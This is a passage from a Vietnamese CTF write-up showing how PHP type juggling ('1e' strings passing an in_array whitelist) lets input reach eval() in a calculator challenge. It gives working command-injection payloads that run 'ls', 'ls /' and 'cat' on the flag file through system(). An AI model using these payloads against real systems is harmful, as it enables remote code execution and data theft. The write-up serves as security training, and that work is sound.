<p>Chúng ta thấy, vậy là nếu ép kiểu 1 string <code>1e</code> theo sau là 1 string bất kỳ (ví dụ: <code>1eaaaa</code> ) về kiểu int, thì sẽ là <code>(int) 1</code></p>
<h3 id="bypass-để-in_arrayparam1-whitelist_numbers-là-true">Bypass để <code>in_array($param1, $whitelist_numbers)</code> là <code>true</code></h3>
<ul>
<li>$param1 = $_GET[&lsquo;p1&rsquo;];</li>
<li>$whitelist_numbers =  range(1, 1000);</li>
</ul>
<p>⇒ <code>$param1 = ‘1e' +**string bất kỳ**</code> thì <code>in_array($param1, $whitelist_numbers)</code> sẽ là true.</p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_21.05.47.png" alt="Screen Shot 2022-03-26 at 21.05.47.png"></p>
<h3 id="bypass-để-in_arrayparam2-whitelist_numbers-là-true">Bypass để <code>in_array($param2, $whitelist_numbers)</code> là <code>true</code></h3>
<ul>
<li>$param2 = $_GET[&lsquo;p2&rsquo;];</li>
<li>$whitelist_numbers =  range(1, 1000);</li>
</ul>
<p>⇒ <code>$param2 = ‘1e' +**string bất kỳ**</code> thì <code>in_array($param2, $whitelist_numbers)</code> sẽ là true.</p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_21.06.22.png" alt="Screen Shot 2022-03-26 at 21.06.22.png"></p>
<h3 id="để-in_arrayoperator-whitelist_ops-là-true">Để <code>in_array($operator, $whitelist_ops)</code> là true.</h3>
<ul>
<li>$whitelist_ops = array(&quot;+&quot;,&quot;-&quot;,&quot;*&quot;,&quot;/&quot;);</li>
<li>$operator = $_GET[&lsquo;op&rsquo;];</li>
</ul>
<p>⇒ Chỉ cần $operator là 1 trong các ký tự <code>&quot;+&quot;,&quot;-&quot;,&quot;*&quot;,&quot;/&quot;</code> đều được.</p>
<h3 id="xem-cách-tạo-ra-tham-số-truyền-vào-eval">Xem cách tạo ra tham số truyền vào <code>eval()</code></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$exec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>param1<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>operator<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>param2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>$evalcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;return </span><span style="color:#e6db74">$exec</span><span style="color:#e6db74">;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $exec <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; = &#34;</span><span style="color:#f92672">.</span> <span style="color:#66d9ef">eval</span>($evalcode);
</span></span></code></pre></div><p>Tham số truyền vào <code>eval()</code> có dạng <code>return ${param1} ${operator} ${param2}</code></p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_21.13.14.png" alt="Screen Shot 2022-03-26 at 21.13.14.png"></p>
<h2 id="iii-khai-thác">III. Khai thác</h2>
<p>Bây giờ chúng ta đã có thể kiểm soát được input tùy ý, nhưng vẫn có thể khiến <code>if( in_array($param1, $whitelist_numbers) &amp;&amp; in_array($param2, $whitelist_numbers) &amp;&amp; in_array($operator, $whitelist_ops) )</code> là true, bằng cách thêm <code>1e</code> và $param1, $param2.</p>
<p>Vậy phải làm sao để khai thác được? Trong PHP có function <code>system($cmd)</code> dùng để gọi câu lệnh của hệ thống, ví dụ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;whoami&#39;</span>);
</span></span></code></pre></div><p>Sẽ là trả về <code>whoami</code>.</p>
<p>Chúng ta sẽ thử input vào $param2 để tham số truyền vào <code>eval()</code> có dạng như bên dưới:</p>
<p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_21.18.28.png" alt="Screen Shot 2022-03-26 at 21.18.28.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">param1</span>} <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">operator</span>} <span style="color:#ae81ff">1</span><span style="color:#a6e22e">e</span>{<span style="color:#a6e22e">payload</span>}
</span></span></code></pre></div><p>Chúng ta sẽ thử với.</p>
<ul>
<li><code>p1=1e01</code></li>
<li><code>p1=1e01</code></li>
<li><code>op=*</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">p1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1e01</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">p2</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1e01</span><span style="color:#f92672">.</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;ls&#39;</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">op</span><span style="color:#f92672">=*</span>
</span></span></code></pre></div><p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_21.21.48.png" alt="Screen Shot 2022-03-26 at 21.21.48.png"></p>
<p>Chúng ta đã thấy, các file có trong cùng folder với source code đã được show ra.</p>
<p>Việc của chúng ta bây giờ là tìm file flag và đọc nó.</p>
<p>Tôi thử đi ra folder <code>ls</code> folder <code>/</code> xem sao.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">p1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1e01</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">p2</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1e01</span><span style="color:#f92672">.</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;ls /&#39;</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">op</span><span style="color:#f92672">=*</span>
</span></span></code></pre></div><p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_21.23.31.png" alt="Screen Shot 2022-03-26 at 21.23.31.png"></p>
<p>Rồi rồi, chúng ta đã thấy file có tên <strong><code>DAY_LA_CAI_FLAG_CHUC_MUNG_BAN</code>,</strong> Bây giờ chỉ cần đọc nó lên thôi.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">p1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1e01</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">p2</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1e01</span><span style="color:#f92672">.</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;cat /DAY_LA_CAI_FLAG_CHUC_MUNG_BAN&#39;</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">op</span><span style="color:#f92672">=*</span>
</span></span></code></pre></div><p><img src="https://manhnv.com/images/posts/ctf/CyberJutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/Screen_Shot_2022-03-26_at_21.25.23.png" alt="Screen Shot 2022-03-26 at 21.25.23.png"></p>
<p>⇒ Flag là: <strong><code>CBJS{type_juggling_PHP_is_weird}</code></strong></p>
<h2 id="iv-tổng-kết">IV. Tổng kết</h2>
<p>Vậy là chúng ta vừa đi giải một bài về <code>PHP Type Juggling</code> khá hay ho.</p>
<p>Nếu bài viết có chỗ nào chưa được hợp lý, mong các bạn đóng góp thêm để mình ngày càng hoàn thiện hơn.</p>
<p>Cảm ơn các bạn đã đọc bài.</p>

              


            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">THẺ ĐÁNH DẤU</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf/">ctf</a>

                  </div>
                
              
            
            
<div class="post-actions-wrap">
  <nav >
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--disabled">
          
              <i class="fa fa-angle-left"></i>
              <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
            </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/post/devsecops/lam-the-nao-de-ngan-khong-cho-dev-commit-secrets-len-git-ngan-chan-va-phat-hien-secrets-trong-git/" data-tooltip="Làm thế nào để ngăn không cho Dev commit secrets lên git? Ngăn chặn và phát hiện secrets trong Git" aria-label="Trước: Làm thế nào để ngăn không cho Dev commit secrets lên git? Ngăn chặn và phát hiện secrets trong Git">
          
              <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
              <i class="fa fa-angle-right"></i>
            </a>
        </li>
      
    </ul>
  </nav>
<ul class="post-actions post-action-share" >
  
    <li class="post-action hide-lg hide-md hide-sm">
      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Chia sẻ bài viết này">
        <i class="fa fa-share-alt" aria-hidden="true"></i>
      </a>
    </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
          <i class="fab fa-facebook-square" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
          <i class="fab fa-twitter" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
          <i class="fab fa-linkedin" aria-hidden="true"></i>
        </a>
      </li>
    
  
  
    <li class="post-action">
      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Để lại một bình luận">
        <i class="far fa-comment"></i>
      </a>
    </li>
  
  <li class="post-action">
    
      <a class="post-action-btn btn btn--default" href="#top" aria-label="Trở lại đầu trang">
      <i class="fa fa-arrow-up" aria-hidden="true"></i>
    
    </a>
  </li>
</ul>
</div>


            
  
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
    </div>
    <script type="text/javascript">
      var disqus_config = function() {
        this.page.url = 'https:\/\/manhnv.com\/post\/ctf\/cyberjutsu\/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe\/';
        
          this.page.identifier = '\/post\/ctf\/cyberjutsu\/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe\/'
        
      };
      (function() {
        
        
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
          return;
        }
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = 'manhnv';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      })();
    </script>
  


          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2022 <a href="https://manhnv.com">Manhnv</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
        
<div class="post-actions-wrap">
  <nav >
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--disabled">
          
              <i class="fa fa-angle-left"></i>
              <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
            </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/post/devsecops/lam-the-nao-de-ngan-khong-cho-dev-commit-secrets-len-git-ngan-chan-va-phat-hien-secrets-trong-git/" data-tooltip="Làm thế nào để ngăn không cho Dev commit secrets lên git? Ngăn chặn và phát hiện secrets trong Git" aria-label="Trước: Làm thế nào để ngăn không cho Dev commit secrets lên git? Ngăn chặn và phát hiện secrets trong Git">
          
              <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
              <i class="fa fa-angle-right"></i>
            </a>
        </li>
      
    </ul>
  </nav>
<ul class="post-actions post-action-share" >
  
    <li class="post-action hide-lg hide-md hide-sm">
      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Chia sẻ bài viết này">
        <i class="fa fa-share-alt" aria-hidden="true"></i>
      </a>
    </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
          <i class="fab fa-facebook-square" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
          <i class="fab fa-twitter" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://manhnv.com/post/ctf/cyberjutsu/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
          <i class="fab fa-linkedin" aria-hidden="true"></i>
        </a>
      </li>
    
  
  
    <li class="post-action">
      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Để lại một bình luận">
        <i class="far fa-comment"></i>
      </a>
    </li>
  
  <li class="post-action">
    
      <a class="post-action-btn btn btn--default" href="#top" aria-label="Trở lại đầu trang">
      <i class="fa fa-arrow-up" aria-hidden="true"></i>
    
    </a>
  </li>
</ul>
</div>


      </div>
      
<div id="share-options-bar" class="share-options-bar" data-behavior="5">
  <i id="btn-close-shareoptions" class="fa fa-times"></i>
  <ul class="share-options">
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmanhnv.com%2Fpost%2Fctf%2Fcyberjutsu%2Fwriteup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe%2F" aria-label="Chia sẻ với Facebook">
          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Chia sẻ với Facebook</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fmanhnv.com%2Fpost%2Fctf%2Fcyberjutsu%2Fwriteup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe%2F" aria-label="Chia sẻ với Twitter">
          <i class="fab fa-twitter" aria-hidden="true"></i><span>Chia sẻ với Twitter</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fmanhnv.com%2Fpost%2Fctf%2Fcyberjutsu%2Fwriteup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe%2F" aria-label="Chia sẻ với Linkedin">
          <i class="fab fa-linkedin" aria-hidden="true"></i><span>Chia sẻ với Linkedin</span>
        </a>
      </li>
    
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>


    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-times"></i>
    </div>
    
      <img id="about-card-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
    
    <h4 id="about-card-name">Manh NV</h4>
    
      <div id="about-card-bio">Chia sẻ là niềm vui</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Viết blog dạo
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker-alt"></i>
        <br/>
        VietNam
      </div>
    
  </div>
</div>

    

    
  
    
      <div id="cover" style="background-image:url('https://manhnv.com/images/cover-v1.2.0.jpg');"></div>
    
  


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


<script src="https://manhnv.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>


  
    <script src="https://manhnv.com/js/scripts.js"></script>
  

  
    <script async crossorigin="anonymous" defer src="https://manhnv.disqus.com/count.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
  

  
    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
  


<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight > code, pre > code').each(function(i, block) {
    if (!$(this).hasClass('codeblock')) {
      $(this).addClass('codeblock');
    }
    hljs.highlightBlock(block);
  });
});
</script>




    
  </body>
</html>

